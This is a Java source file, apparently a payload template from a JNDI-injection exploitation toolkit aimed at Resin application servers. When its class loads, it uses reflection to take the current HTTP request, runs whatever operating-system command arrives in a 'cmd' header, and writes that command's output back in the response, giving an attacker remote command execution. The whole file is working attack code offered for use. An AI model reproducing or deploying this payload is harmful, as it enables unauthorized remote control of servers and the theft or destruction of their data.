package com.qi4l.jndi.template.resin;

public class resinEcho {
    static {
        try {
            Class                   clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);

            Object[] obj_arr = (Object[]) obj;
            for (int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;

                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);

                if (obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                    com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest) obj;
                    String                             cmd         = httpRequest.getHeader("cmd");

                    if (cmd != null && !cmd.isEmpty()) {
                        String                              res          = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
                        httpResponse.setHeader("Content-Length", res.length() + "");
                        java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream", null);
                        method.setAccessible(true);
                        com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse, null);
                        httpResponseStream.write(res.getBytes(), 0, res.length());
                        httpResponseStream.close();
                    }

                    break;
                }
            }
        } catch (Exception ignored) {
        }

    }
}
